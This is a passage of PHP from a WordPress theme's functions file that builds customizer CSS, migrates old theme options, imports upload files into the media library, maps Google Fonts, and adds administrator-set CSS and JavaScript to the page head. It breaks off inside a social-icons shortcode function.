function onepage_catch_that_image() {
    global $post, $posts;
    $first_img = '';
    ob_start();
    ob_end_clean();
    $output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);
    $first_img = isset($matches[1][0]) ? $matches[1][0] : null;
    if (empty($first_img)) {
        $first_img = '';
    }
    return $first_img;
}

/**
 * Alter brightness
 */
function alter_brightness($colourstr, $steps) {
    $colourstr = str_replace('#', '', $colourstr);
    $rhex = substr($colourstr, 0, 2);
    $ghex = substr($colourstr, 2, 2);
    $bhex = substr($colourstr, 4, 2);

    $r = hexdec($rhex);
    $g = hexdec($ghex);
    $b = hexdec($bhex);

    $r = max(0, min(255, $r + $steps));
    $g = max(0, min(255, $g + $steps));
    $b = max(0, min(255, $b + $steps));

    return '#' . dechex($r) . dechex($g) . dechex($b);
}

/**
 * Customizer CSS for the theme
 */
add_action('wp_head', 'customizer_css');

function section_strip_color($bg_color) {
    if ($bg_color == "#FFFFFF" || $bg_color == "#FFF" || $bg_color == "white" || $bg_color == "#ffffff" || $bg_color == "#fff" || $bg_color == "WHITE") {
        $bg_color = '#FFFFFF';
        $border_color = '#DCDCDB';
    } else {
        $border_color = alter_brightness($bg_color, 100);
    }
    return $border_color;
}

function customizer_css() {
    $output = "<style>" .
            "body, p, h1,h2,h3,h4,h5,h6,.navbar-default .navbar-nav>li>a,.footer .foot_head {
            font-family :" . wp_kses_post(font_family_selection(onepage_get_option('onepage_font_family_select'))) . ";}
            h1,
            .page_heading h1,
            h1.post_title,
            h1.post_title a,
            .page-title{
                font-size:" . wp_kses_post(onepage_get_option('onepage_heading1_font_size', '26px')) . "!important;
                line-height:" . wp_kses_post(onepage_get_option('onepage_heading1_line_height', '1.2em')) . "!important;
                font-weight:" . wp_kses_post(onepage_get_option('onepage_heading1_font_weight', '100')) . ";
                font-style:" . wp_kses_post(onepage_get_option('onepage_heading1_font_style', 'normal')) . ";
                color:" . wp_kses_post(onepage_get_option('onepage_heading1_font_color', '#272727')) . ";}
            h2{
                font-size:" . wp_kses_post(onepage_get_option('onepage_heading2_font_size', '26px')) . ";
                line-height:" . wp_kses_post(onepage_get_option('onepage_heading2_line_height', '31px')) . ";
                font-weight:" . wp_kses_post(onepage_get_option('onepage_heading2_font_weight', '100')) . ";
                font-style:" . wp_kses_post(onepage_get_option('onepage_heading2_font_style', 'normal')) . ";
                color:" . wp_kses_post(onepage_get_option('onepage_heading2_font_color', '#272727')) . ";}
            h3{
                font-size:" . wp_kses_post(onepage_get_option('onepage_heading3_font_size', '24px')) . "!important;
                line-height:" . wp_kses_post(onepage_get_option('onepage_heading3_line_height', '31px')) . "!important;
                font-weight:" . wp_kses_post(onepage_get_option('onepage_heading3_font_weight', '100')) . ";
                font-style:" . wp_kses_post(onepage_get_option('onepage_heading3_font_style', 'normal')) . ";
                color:" . wp_kses_post(onepage_get_option('onepage_heading3_font_color', '#272727')) . ";}
            h4{
                font-size:" . wp_kses_post(onepage_get_option('onepage_heading4_font_size', '22px')) . ";
                line-height:" . wp_kses_post(onepage_get_option('onepage_heading4_line_height', '31px')) . ";
                font-weight:" . wp_kses_post(onepage_get_option('onepage_heading4_font_weight', '100')) . ";
                font-style:" . wp_kses_post(onepage_get_option('onepage_heading4_font_style', 'normal')) . ";
                color:" . wp_kses_post(onepage_get_option('onepage_heading4_font_color', '#272727')) . ";}
            h5{
                font-size:" . wp_kses_post(onepage_get_option('onepage_heading5_font_size', '20px')) . ";
                line-height:" . wp_kses_post(onepage_get_option('onepage_heading5_line_height', '31px')) . ";
                font-weight:" . wp_kses_post(onepage_get_option('onepage_heading5_font_weight', '100')) . ";
                font-style:" . wp_kses_post(onepage_get_option('onepage_heading5_font_style', 'normal')) . ";
                color:" . wp_kses_post(onepage_get_option('onepage_heading5_font_color', '#272727')) . ";}
            h6{
                font-size:" . wp_kses_post(onepage_get_option('onepage_heading6_font_size', '18px')) . ";
                line-height:" . wp_kses_post(onepage_get_option('onepage_heading6_line_height', '31px')) . ";
                font-weight:" . wp_kses_post(onepage_get_option('onepage_heading6_font_weight', '100')) . ";
                font-style:" . wp_kses_post(onepage_get_option('onepage_heading6_font_style', 'normal')) . ";
                color:" . wp_kses_post(onepage_get_option('onepage_heading6_font_color', '#272727')) . ";}
            p,
            .section_div .section_content,
            .section_div .section_content p,
            .blog_div .post p{
                font-size:" . wp_kses_post(onepage_get_option('onepage_paragraph_font_size', '15px')) . ";
                line-height:" . wp_kses_post(onepage_get_option('onepage_paragraph_line_height', '1.8em')) . ";
                font-weight:" . wp_kses_post(onepage_get_option('onepage_paragraph_font_weight', 'normal')) . ";
                font-style:" . wp_kses_post(onepage_get_option('onepage_paragraph_font_style', 'normal')) . ";
            }   
            p,
            .blog_div .post p,
            .services_div .services_item p,
            .post_content a,
            .widget_area a,
            .sidebar .tagcloud a,
            .widget_area table caption{
             color:" . wp_kses_post(onepage_get_option('onepage_paragraph_font_color', '#524E4E')) . ";}
            }
            .top_left_contact .glyphicon{
                color:" . wp_kses_post(onepage_get_option('onepage_top_call_us_icon_color', '#fff')) . ";}
            .top_left_contact p{
                color:" . wp_kses_post(onepage_get_option('onepage_top_call_us_num_color', '#fff')) . ";}
            .top_strip{
                background-color:" . wp_kses_post(onepage_get_option('onepage_header_strip_bg_color', '#444')) . ";}
            .header .navbar {
                background-color:" . wp_kses_post(onepage_get_option('onepage_header_bg_color', '#ffffff')) . ";
            }
            .navbar-default .navbar-nav>li>a{
                color:" . wp_kses_post(onepage_get_option('onepage_menu_list_color', '#272727')) . ";
                border-bottom-color:" . wp_kses_post(onepage_get_option('onepage_header_bg_color', '#fff')) . ";
            }
            .navbar-default .navbar-nav>li>a:hover {
                border-bottom-color:" . wp_kses_post(onepage_get_option('onepage_menu_list_hover_border_color', '#e39d37')) . ";
                background-color:" . wp_kses_post(onepage_get_option('onepage_menu_list_hover_bg_color', '#eee')) . ";
                color:" . wp_kses_post(onepage_get_option('onepage_menu_list_color', '#272727')) . ";
            }
            .navbar-default .navbar-nav>.current>a,
            .navbar-default .navbar-nav>.current_page_item>a,
            .navbar-default .navbar-nav>.current>a:hover,
            .navbar-default .navbar-nav>.current>a:focus{
                background-color:" . wp_kses_post(onepage_get_option('onepage_menu_list_active_bg_color', '#ffcc81')) . ";
                border-color:" . wp_kses_post(onepage_get_option('onepage_menu_list_active_border_color', '#e39d37')) . ";
            }
            .header .logo h1{
                color:" . wp_kses_post(onepage_get_option('onepage_header_logo_text_color', '#272727')) . ";
            }
            /* Heading color*/
            .widget_title,
            .pricing_wrapper .pricing_item ul li.table_icon span,
            .footer_widget .widget_area select,
            .widget_area table caption{
                color:" . wp_kses_post(onepage_get_option('pages_widget_heading_color_scheme', '#272727')) . ";
            }
            /*Breadcrumbs, search bar, table background color*/
            .homepage_nav_title,
            .searchform input[type='text'],
            table th{
                background-color:" . wp_kses_post(onepage_get_option('pages_color_scheme', '#087f99')) . ";
            }
            .searchform #searchsubmit,
            input[type='submit']{
                background-color:" . wp_kses_post(onepage_get_option('pages_button_bg_color', '#22b0cf')) . ";
            }
            input[type='submit']:hover{
                background-color:" . wp_kses_post(onepage_get_option('pages_button_hover_bg_color', '#1D93AD')) . ";
            }
            input[type='submit']{
                border-bottom-color:" . wp_kses_post(onepage_get_option('pages_button_bottom_border_color', '#1D93AD')) . ";
            }
            .slider_caption h2{
               font-size: " . wp_kses_post(onepage_get_option('onepage_slide_main_heading_size', '46px')) . "          
            }
            .slider_caption p{
               font-size: " . wp_kses_post(onepage_get_option('onepage_slide_sub_heading_size', '22px')) . "          
            }
            .slider_caption .slider_button{
               font-size: " . wp_kses_post(onepage_get_option('onepage_slide_button_size', '24px')) . "          
            }
            .homepage_nav_title a:hover,
            .footer ul li a:hover,
            .footer_widget a:hover,
            .post a:hover,
            .post_content  a:hover,
            .posted_by a:hover,
            .widget_area li a:hover,
            .comment-meta a:hover,
            #commentform p  a:hover,
            a:hover,
            a:focus,
            a:active,
            a.active {
                color:" . wp_kses_post(onepage_get_option('pages_anchor_hover_color', '#18bc9c')) . ";
            }
            .post a,.post_content  a {
                color:" . wp_kses_post(onepage_get_option('onepage_pages_anchor_color', '#087f99')) . ";
            }
            .blog_div{
        background-color:" . wp_kses_post(onepage_get_option('onepage_blog_bg_color', '#1bbc9b')) . ";
    }
    .blog_div h2{
        color:" . wp_kses_post(onepage_get_option('onepage_blog_section_heading_color', '#ffffff')) . ";
    }
    .blog_div .main_desc{
        color:" . wp_kses_post(onepage_get_option('onepage_blog_section_sub_heading_color', '#ffffff')) . ";
    }
    .blog_div .blog_sep {
        background-color:" . section_strip_color(wp_kses_post(onepage_get_option('onepage_blog_bg_color', '#1bbc9b'))) . ";
    }
    .blog_div .post .read_more{
        background-color:" . wp_kses_post(onepage_get_option('onepage_blog_read_more_button_color', '#f47264')) . ";
        box-shadow: 0 3px 0 " . wp_kses_post(onepage_get_option('onepage_blog_read_more_button_border_bottom_color', '#DE2929')) . ";
    }
    .blog_div .post .read_more:hover{
        background-color:" . wp_kses_post(onepage_get_option('onepage_blog_read_more_button_hover_color', '#DE2929')) . ";
        box-shadow: 0 3px 0 " . wp_kses_post(onepage_get_option('onepage_blog_read_more_button_border_bottom_color', '#DE2929')) . ";
    }
            /* Contact Us Section */
                .contact_div{
        background-color:" . wp_kses_post(onepage_get_option('onepage_contact_bg_color', '#9792d4')) . ";
    }
    .contact_div .main_head{
        color:" . wp_kses_post(onepage_get_option('onepage_contact_section_heading_color', '#ffffff')) . ";
    }
    .contact_div .main_desc{
        color:" . wp_kses_post(onepage_get_option('onepage_contact_section_sub_heading_color', '#ffffff')) . ";
    }
    .contact_div .team_sep {
        background-color:" . section_strip_color(wp_kses_post(onepage_get_option('onepage_contact_bg_color', '#9792d4'))) . ";
    }
    .contact_div .contactform input[type='submit']{
        background:" . wp_kses_post(onepage_get_option('onepage_contact_send_button_color', '#f5783e')) . ";
        border-bottom-color:" . wp_kses_post(onepage_get_option('onepage_contact_send_button_bottom_border_color', '#a95015')) . ";
    }
    .contact_div .contactform input[type='submit']:hover {
        background: " . wp_kses_post(onepage_get_option('onepage_contact_send_button_hover_color', '#a95015')) . ";
    }
    /* Hexagonal gallery */
        .gallery_div{
        background-color:" . wp_kses_post(onepage_get_option('onepage_portfolio_bg_color', 'fff')) . ";
    }
    .gallery_div h2{
        color:" . wp_kses_post(onepage_get_option('onepage_portfolio_section_heading_color', '#272727')) . ";
    }
    .gallery_div .main_desc{
        color:" . wp_kses_post(onepage_get_option('onepage_portfolio_section_sub_heading_color', '#6D6C6C')) . ";
    }
    .gallery_div .gallery_sep {
        background-color: " . section_strip_color(wp_kses_post(onepage_get_option('onepage_portfolio_bg_color', '#ffffff'))) . ";
    }
    .gallery_wrapper #filters li{
        background-color:   " . wp_kses_post(onepage_get_option('onepage_portfolio_tab_color', '#9792d4')) . ";
        box-shadow: 0 3px 0 " . wp_kses_post(onepage_get_option('onepage_portfolio_tab_border_bottom_color', '#625d99')) . ";
    }
    .gallery_wrapper #filters li:hover,
    .gallery_wrapper #filters li.active{
        background-color:   " . wp_kses_post(onepage_get_option('onepage_portfolio_active_tab_color', '#f87a6c')) . ";
        box-shadow: 0 3px 0 " . wp_kses_post(onepage_get_option('onepage_portfolio_active_tab_border_bottom_color', '#ba4639')) . ";
    }
    .hex h1,
    .hex .hexGal-content{
        background-color:   " . wp_kses_post(onepage_get_option('onepage_portfolio_hexagon_hover_bg_color', 'rgba(0, 0, 0, 0.61)')) . ";
    }
    /* Pricing section */
    .pricing_div{
        background-color: " . wp_kses_post(onepage_get_option('onepage_pricing_bg_color', '#f8a841')) . ";
    }
    .pricing_div .main_head{
        color:" . wp_kses_post(onepage_get_option('onepage_pricing_section_heading_color', '#ffffff')) . ";
    }
    .pricing_div .main_desc{
        color:" . wp_kses_post(onepage_get_option('onepage_pricing_section_sub_heading_color', '#ffffff')) . ";
    }
    .pricing_div .pricing_sep {
        background-color: " . wp_kses_post(section_strip_color(onepage_get_option('onepage_pricing_bg_color', '#f8a841'))) . ";
    }
    .pricing_wrapper .pricing_item.one {
        background-color: " . wp_kses_post(onepage_get_option('onepage_pricing_box1_bg_color', '#1bbc9b')) . ";
    }
    .pricing_wrapper .pricing_item.two{
        background-color: " . wp_kses_post(onepage_get_option('onepage_pricing_box2_bg_color', '#f47264')) . ";
    }
    .pricing_wrapper .pricing_item.three {
        background-color: " . wp_kses_post(onepage_get_option('onepage_pricing_box3_bg_color', '#1bbc9b')) . ";
    }
    .pricing_wrapper .pricing_item.one ul li.table_icon span{
        color: " . wp_kses_post(onepage_get_option('onepage_pricing_box_icon_color', '#272727')) . ";
        border-color: " . wp_kses_post(onepage_get_option('onepage_pricing_box1_icon_border_color', '#3BD9BC')) . ";
    }
    .pricing_wrapper .pricing_item.two ul li.table_icon span{
        color: " . wp_kses_post(onepage_get_option('onepage_pricing_box_icon_color', '#272727')) . ";
        border-color: " . wp_kses_post(onepage_get_option('onepage_pricing_box2_icon_border_color', '#f8a841')) . ";
    }
    .pricing_wrapper .pricing_item.three ul li.table_icon span{
        color: " . wp_kses_post(onepage_get_option('onepage_pricing_box_icon_color', '#272727')) . ";
        border-color: " . wp_kses_post(onepage_get_option('onepage_pricing_box3_icon_border_color', '#3BD9BC')) . ";
    }
    .pricing_wrapper .pricing_item ul li.table_heading h3{
        color:" . wp_kses_post(onepage_get_option('onepage_pricing_box_heading_color', '#fff')) . ";
    }
    .pricing_wrapper .pricing_item ul li.table_price{
        color:" . wp_kses_post(onepage_get_option('onepage_pricing_box_pricing_color', '#fff')) . ";
        border-color:" . wp_kses_post(onepage_get_option('onepage_pricing_box_pricing_bottom_border_color', '#F8C841')) . ";
    }
    .pricing_wrapper .pricing_item ul li{
        color:" . wp_kses_post(onepage_get_option('onepage_pricing_box_list_color', '#fff')) . ";
    }
    .pricing_wrapper .pricing_item ul li.table_button a{
        background-color: " . wp_kses_post(onepage_get_option('onepage_pricing_box_button_color', '#dfae45')) . ";
            border-bottom-color: " . wp_kses_post(onepage_get_option('onepage_pricing_box_button_bottom_border_color', '#70510e')) . ";
    }
        .pricing_wrapper .pricing_item ul li.table_button a:hover{
        background-color: " . wp_kses_post(onepage_get_option('onepage_pricing_box_button_hover_color', '#CE9E38')) . ";
    }
/* Services section */
    #services{
        background-color:" . wp_kses_post(onepage_get_option('onepage_service_box_bg_color', '#fff')) . ";
    }
    .services_div .service_sep {
        background-color: " . wp_kses_post(section_strip_color(onepage_get_option('onepage_service_box_bg_color', '#ffffff'))) . ";
    }
    .services_div h2{
        color:" . wp_kses_post(onepage_get_option('onepage_service_section_heading_color', '#272727')) . ";
    }
    .services_div p.main_desc{
        color:" . wp_kses_post(onepage_get_option('onepage_service_section_sub_heading_color', '#6D6C6C')) . ";
    }
    .services_div .services_item span.one {
        color: " . wp_kses_post(onepage_get_option('onepage_service_box_color_icon_1', '#e6557c')) . ";
        border-color: " . wp_kses_post(onepage_get_option('onepage_service_box_color_border_1', '#e6557c')) . ";
    }
    .services_div .services_item span.two {
        color: " . wp_kses_post(onepage_get_option('onepage_service_box_color_icon_2', '#00b9db')) . ";
        border-color: " . wp_kses_post(onepage_get_option('onepage_service_box_color_border_2', '#00b9db')) . ";
    }
    .services_div .services_item span.three {
        color: " . wp_kses_post(onepage_get_option('onepage_service_box_color_icon_3', '#dcaf31')) . ";
        border-color: " . wp_kses_post(onepage_get_option('onepage_service_box_color_border_3', '#dcaf31')) . ";
    }
    .services_div .services_item span.four{
        color: " . wp_kses_post(onepage_get_option('onepage_service_box_color_icon_4', '#9792d4')) . ";
        border-color: " . wp_kses_post(onepage_get_option('onepage_service_box_color_border_4', '#9792d4')) . ";
    }
/* Team section */
    .team_div{
        background-color: " . wp_kses_post(onepage_get_option('onepage_team_bg_color', '#FFF')) . ";
    }
    .team_div h2{
        color:" . wp_kses_post(onepage_get_option('onepage_team_section_heading_color', '#272727')) . ";
    }
    .team_div .main_desc{
        color:" . wp_kses_post(onepage_get_option('onepage_team_section_sub_heading_color', '#6D6C6C')) . ";
    }
    .team_div .team_sep {
        background-color: " . wp_kses_post(section_strip_color(onepage_get_option('onepage_team_bg_color', '#FFFFFF'))) . ";
    }
    .team_wrapper .team_item h4{
    color:" . wp_kses_post(onepage_get_option('onepage_team_member_name_color', '#272727')) . ";
        }
    .team_wrapper .team_item span{
    color:" . wp_kses_post(onepage_get_option('onepage_team_member_designation_text_color', '#235e11')) . ";
        }
    /* Testimonial section */
        .testimonial_div{
        background-color:" . wp_kses_post(onepage_get_option('onepage_testimonial_section_bg_color', 'fff')) . ";
    }
    .testimonial_div .testimonial_sep{
             background-color: " . wp_kses_post(section_strip_color(onepage_get_option('onepage_testimonial_section_bg_color', '#FFFFFF'))) . ";
            }
    .testimonial_div h2{
        color:" . wp_kses_post(onepage_get_option('onepage_testimonial_section_heading_color', '#272727')) . ";
    }
    .testimonial_div .testimonial_sep {
        background: " . wp_kses_post(onepage_get_option('onepage_testimonial_section_hr_color', '#DCDCDB')) . ";
    }
    .testimonial_div .main_desc{
        color:" . wp_kses_post(onepage_get_option('onepage_testimonial_section_sub_heading_color', '#6D6C6C')) . ";
    }
    .bx-wrapper .bx-caption span,
    .bx-wrapper img,
    .bx-wrapper .bx-pager.bx-default-pager a:hover,
    .bx-wrapper .bx-pager.bx-default-pager a.active {
        border-color: " . wp_kses_post(onepage_get_option('onepage_testimonial_section_content_border_color', '#bab7e0')) . ";
    }
    .bx-wrapper .bx-caption span:before{
        border-right-color: " . wp_kses_post(onepage_get_option('onepage_testimonial_section_content_border_color', '#bab7e0')) . ";
    }
    /* Video section */
        .frame_div{
        background-color:" . wp_kses_post(onepage_get_option('onepage_video_section_bg_color', '#00c1e4')) . ";
    }
    .frame_div .main_head{
        color:" . wp_kses_post(onepage_get_option('onepage_video_section_heading_color', '#ffffff')) . ";
    }
    .frame_div .main_desc{
        color:" . wp_kses_post(onepage_get_option('onepage_video_section_sub_heading_color', '#ffffff')) . ";
    }
    .frame_div .frame_sep {
        background: " . wp_kses_post(section_strip_color(onepage_get_option('onepage_video_section_bg_color', '#00c1e4'))) . ";
    }" .
            "</style>";

    echo $output;
}

/**
 * Migrate Option Panel To Customizer
 */
function onepage_migrate_option() {
    if (get_option('onepage_options') && !get_option('onepage_option_migrate')) {
        $theme_options = array('onepage_logo', 'onepage_favicon', 'onepage_slideimage1', 'onepage_our_services_image1', 'onepage_our_services_image2', 'onepage_our_services_image3', 'onepage_our_services_image4');
        $wp_upload_dir = wp_upload_dir();
        require ( ABSPATH . 'wp-admin/includes/image.php' );
        foreach ($theme_options as $option) {
            $option_value = onepage_get_option($option);
            if ($option_value && $option_value != '') {
                $filetype = wp_check_filetype(basename($option_value), null);
                $image_name = preg_replace('/\.[^.]+$/', '', basename($option_value));
                $new_image_url = $wp_upload_dir['path'] . '/' . $image_name . '.' . $filetype['ext'];
                onepage_import_file($new_image_url);
            }
        }
        update_option('onepage_option_migrate', true);
    }
    if (get_option('onepage_options') && !get_option('onepage_option_replace')) {
        $options = onepage_option_replace();
        foreach ($options as $prev_key => $next_key) {
            $prev_value = onepage_get_option($prev_key);
            $next_value = onepage_get_option($next_key);
            if (empty($next_value) || $next_value != '') {
                onepage_update_option($next_key, $prev_value);
            }
        }
        update_option('onepage_option_replace', true);
    }
}

add_action('init', 'onepage_migrate_option');

/**
 * Import Files From Uploads To Attachment
 */
function onepage_import_file($file, $post_id = 0, $import_date = 'file') {
    set_time_limit(120);
// Initially, Base it on the -current- time.
    $time = current_time('mysql', 1);
//     Next, If it's post to base the upload off:
    $time = gmdate('Y-m-d H:i:s', @filemtime($file));
//     A writable uploads dir will pass this test. Again, there's no point overriding this one.
    if (!( ( $uploads = wp_upload_dir($time) ) && false === $uploads['error'] )) {
        return new WP_Error('upload_error', $uploads['error']);
    }
    $wp_filetype = wp_check_filetype($file, null);
    extract($wp_filetype);
    if ((!$type || !$ext ) && !current_user_can('unfiltered_upload')) {
        return new WP_Error('wrong_file_type', __('Sorry, this file type is not permitted for security reasons.', 'one-page')); //A WP-core string..
    }
    $file_name = str_replace('\\', '/', $file);
    if (preg_match('|^' . preg_quote(str_replace('\\', '/', $uploads['basedir'])) . '(.*)$|i', $file_name, $mat)) {
        $filename = basename($file);
        $new_file = $file;
        $url = $uploads['baseurl'] . $mat[1];
        $attachment = get_posts(array('post_type' => 'attachment', 'meta_key' => '_wp_attached_file', 'meta_value' => ltrim($mat[1], '/')));
        if (!empty($attachment)) {
            return new WP_Error('file_exists', __('Sorry, That file already exists in the WordPress media library.', 'one-page'));
        }
//Ok, Its in the uploads folder, But NOT in WordPress's media library.
        if ('file' == $import_date) {
            $time = @filemtime($file);
            if (preg_match("|(\d+)/(\d+)|", $mat[1], $datemat)) { //So lets set the date of the import to the date folder its in, IF its in a date folder.
                $hour = $min = $sec = 0;
                $day = 1;
                $year = $datemat[1];
                $month = $datemat[2];
// If the files datetime is set, and it's in the same region of upload directory, set the minute details to that too, else, override it.
                if ($time && date('Y-m', $time) == "$year-$month") {
                    list($hour, $min, $sec, $day) = explode(';', date('H;i;s;j', $time));
                }
                $time = mktime($hour, $min, $sec, $month, $day, $year);
            }
            $time = gmdate('Y-m-d H:i:s', $time);
// A new time has been found! Get the new uploads folder:
// A writable uploads dir will pass this test. Again, there's no point overriding this one.
            if (!( ( $uploads = wp_upload_dir($time) ) && false === $uploads['error'] ))
                return new WP_Error('upload_error', $uploads['error']);
            $url = $uploads['baseurl'] . $mat[1];
        }
    } else {
        $filename = wp_unique_filename($uploads['path'], basename($file));
// copy the file to the uploads dir
        $new_file = $uploads['path'] . '/' . $filename;
        if (false === @copy($file, $new_file))
            return new WP_Error('upload_error', sprintf(__('The selected file could not be copied to %s.', 'one-page'), $uploads['path']));

// Set correct file permissions
        $stat = stat(dirname($new_file));
        $perms = $stat['mode'] & 0000666;
        @ chmod($new_file, $perms);
// Compute the URL
        $url = $uploads['url'] . '/' . $filename;

        if ('file' == $import_date)
            $time = gmdate('Y-m-d H:i:s', @filemtime($file));
    }
//Apply upload filters
    $return = apply_filters('wp_handle_upload', array('file' => $new_file, 'url' => $url, 'type' => $type));
    $new_file = $return['file'];
    $url = $return['url'];
    $type = $return['type'];
    $title = preg_replace('!\.[^.]+$!', '', basename($file));
    $content = '';
    if ($time) {
        $post_date_gmt = $time;
        $post_date = $time;
    } else {
        $post_date = current_time('mysql');
        $post_date_gmt = current_time('mysql', 1);
    }
// Construct the attachment array
    $attachment = array(
        'post_mime_type' => $type,
        'guid' => $url,
        'post_parent' => $post_id,
        'post_title' => $title,
        'post_name' => $title,
        'post_content' => $content,
        'post_date' => $post_date,
        'post_date_gmt' => $post_date_gmt
    );
    $attachment = apply_filters('afs-import_details', $attachment, $file, $post_id, $import_date);
//Win32 fix:
    $new_file = str_replace(strtolower(str_replace('\\', '/', $uploads['basedir'])), $uploads['basedir'], $new_file);
// Save the data
    $id = wp_insert_attachment($attachment, $new_file, $post_id);
    if (!is_wp_error($id)) {
        $data = wp_generate_attachment_metadata($id, $new_file);
        wp_update_attachment_metadata($id, $data);
    }
//update_post_meta( $id, '_wp_attached_file', $uploads['subdir'] . '/' . $filename );
    return $id;
}

function onepage_option_replace() {
    return array(
        'onepage_logo' => 'onepage_header_logo_img',
        'onepage_contact_number' => 'onepage_top_call_us',
        'onepage_slideimage1' => 'onepage_slider_image_1',
        'onepage_sliderheading1' => 'onepage_slider_heading_1',
        'onepage_sliderdes1' => 'onepage_slider_subheading_1',
        'onepage_our_services_heading' => 'onepage_service_section_heading',
        'onepage_our_services_title1' => 'onepage_service_box_heading_1',
        'onepage_our_services_desc1' => 'onepage_service_box_desc_1',
        'onepage_our_services_title2' => 'onepage_service_box_heading_2',
        'onepage_our_services_desc2' => 'onepage_service_box_desc_2',
        'onepage_our_services_title3' => 'onepage_service_box_heading_3',
        'onepage_our_services_desc3' => 'onepage_service_box_desc_3',
        'onepage_our_services_title4' => 'onepage_service_box_heading_4',
        'onepage_our_services_desc4' => 'onepage_service_box_desc_4',
        'onepage_recent_blog_heading' => 'onepage_blog_main_heading',
        'onepage_our_contact_heading' => 'onepage_contact_main_heading',
        'onepage_our_contact_sub_heading' => 'onepage_contact_sub_heading'
    );
}

function onepage_portfolio_tag_list() {
    $terms = get_tags('tag');
    if (empty($terms)) {
        return;
    }
    $tag_list = array();
    $tag_list[''] = __('Select Tag', 'one-page');
    foreach ($terms as $value) {
        $tag_list[$value->term_id] = $value->name;
    }
    return $tag_list;
}

/**
 * Google font 
 */
function onepage_fonts($font_name) {
    global $font_url, $font_family;
    $google_font = array();
    if ($font_name == "") {
        $google_font['font_url'] = NULL;
        $google_font['font_name'] = NULL;
    } else {
        $google_fonts_link = array(
            'select_google_font' => NULL,
            'abril_fatface' => '//fonts.googleapis.com/css?family=Abril+Fatface',
            'arvo' => '//fonts.googleapis.com/css?family=Arvo:400,400italic,700,700italic',
            'droid_sans' => '//fonts.googleapis.com/css?family=Droid+Sans:400,700',
            'droid_serif' => '//fonts.googleapis.com/css?family=Droid+Serif:400,400italic,700,700italic',
            'gravitas_one' => '//fonts.googleapis.com/css?family=Gravitas+One',
            'josefin_slab' => '//fonts.googleapis.com/css?family=Josefin+Slab:400,300,300italic,400italic,600,600italic,700,700italic',
            'lato' => '//fonts.googleapis.com/css?family=Lato:400,300,300italic,400italic,700,700italic',
            'libre_baskerville' => '//fonts.googleapis.com/css?family=Libre+Baskerville:400,400italic,700',
            'lobster' => '//fonts.googleapis.com/css?family=Lobster+Two:400,400italic,700,700italic',
            'lora' => '//fonts.googleapis.com/css?family=Lora:400,400italic,700,700italic',
            'merriweather' => '//fonts.googleapis.com/css?family=Merriweather:400,300,300italic,400italic,700,700italic',
            'montserrat' => '//fonts.googleapis.com/css?family=Montserrat:400,700',
            'old_standard_tt' => '//fonts.googleapis.com/css?family=Old+Standard+TT:400,400italic,700',
            'open_sans' => '//fonts.googleapis.com/css?family=Open+Sans:400,400italic,600,600italic,700,700italic,300,300italic',
            'oswald' => '//fonts.googleapis.com/css?family=Oswald:400,300,700',
            'pt_sans' => '//fonts.googleapis.com/css?family=PT+Sans:400,400italic,700,700italic',
            'pt_serif' => '//fonts.googleapis.com/css?family=PT+Serif:400,400italic,700,700italic',
            'raleway' => '//fonts.googleapis.com/css?family=Raleway:400,300,300italic,400italic,700,700italic,600,600italic',
            'roboto' => '//fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic,500,500italic,700,700italic',
            'source_sans_pro' => '//fonts.googleapis.com/css?family=Source+Sans+Pro:400,400italic,700,700italic,600,300,300italic',
            'ubuntu' => '//fonts.googleapis.com/css?family=Ubuntu:400,400italic,500,500italic,700,700italic,300italic,300',
            'vollkorn' => '//fonts.googleapis.com/css?family=Vollkorn:400,400italic,700,700italic'
        );
        $google_fonts_family = array(
            'select_google_font' => NULL,
            'abril_fatface' => '\'Abril Fatface\', cursive',
            'arvo' => '\'Arvo\', serif',
            'droid_sans' => '\'Droid Sans\', sans-serif',
            'droid_serif' => '\'Droid Serif\', serif',
            'gravitas_one' => '\'Gravitas One\', cursive',
            'josefin_slab' => '\'Josefin Slab\', serif',
            'lato' => '\'Lato\', sans-serif',
            'libre_baskerville' => '\'Libre Baskerville\', serif',
            'lobster' => '\'Lobster Two\', cursive',
            'lora' => '\'Lora\', serif',
            'merriweather' => '\'Merriweather\', serif',
            'montserrat' => '\'Montserrat\', sans-serif',
            'old_standard_tt' => '\'Old Standard TT\', serif;',
            'open_sans' => '\'Open Sans\', sans-serif',
            'oswald' => '\'Oswald\', sans-serif',
            'pt_sans' => '\'PT Sans\', sans-serif',
            'pt_serif' => '\'PT Serif\', serif',
            'raleway' => '\'Raleway\', sans-serif',
            'roboto' => '\'Roboto\', sans-serif',
            'source_sans_pro' => '\'Source Sans Pro\', sans-serif',
            'ubuntu' => '\'Ubuntu\', sans-serif',
            'vollkorn' => '\'Vollkorn\', serif'
        );
        $google_font['font_url'] = $google_fonts_link[$font_name];
        $google_font['font_name'] = $google_fonts_family[$font_name];
    }
    return $google_font;
}

/**
 * Font family selection 
 * @param type $font_name
 * @return type
 */
function font_family_selection($font_name) {
    $font_family = onepage_fonts($font_name);
    return $font_family['font_name'];
}

/**
 * Siderbar Position
 */
function sidebar_position() {
    $selection = wp_kses_post(onepage_get_option('onepage_sidebar_position', 'right'));
    $position = array();
    if ($selection == "left") {
        $position['left_section'] = 'col-md-push-4';
        $position['right_section'] = 'col-md-pull-8';
    } elseif ($selection == "right") {
        $position['left_section'] = '';
        $position['right_section'] = '';
    }
    return $position;
}

/**
 * Custom CSS
 */
function custom_css() {
    $CSS = "";
    /**
     * Applying CSS to sidebar when the selection change.
     */
    $pos = sidebar_position();
    if ($pos['left_section'] != '' && $pos['right_section'] != '') {
        /**
         * Change sidebar CSS
         */
        $CSS = ".sidebar{margin-left:0 !important;margin-right:39px !important;}";
    }
    /**
     * Apply custom css to wp_head
     */
    $custom_css_code = onepage_get_option('onepage_custom_css_section');
    if (isset($custom_css_code) && $custom_css_code != '') {
        $CSS .= $custom_css_code;
    }
    echo '<style>' . $CSS . '</style>';
}

add_action('wp_head', 'custom_css');

/**
 * Custom Javascript code
 */
function custom_js() {
    $custom_js_code = wp_kses_post(onepage_get_option('onepage_custom_js_section'));
    if (isset($custom_js_code) && $custom_js_code != '') {
        echo '<script>' . $custom_js_code . '</script>';
    }
}

add_action('wp_head', 'custom_js');

/**
 * Header Section Social Icons shortcode
 */
function header_social_icons_shortcode($atts, $content = null) {
    extract(shortcode_atts(array(
        'href' => '#',
        'bg_color' => '',
        'title' => '',
        'icon_class' => ''
                    ), $atts));
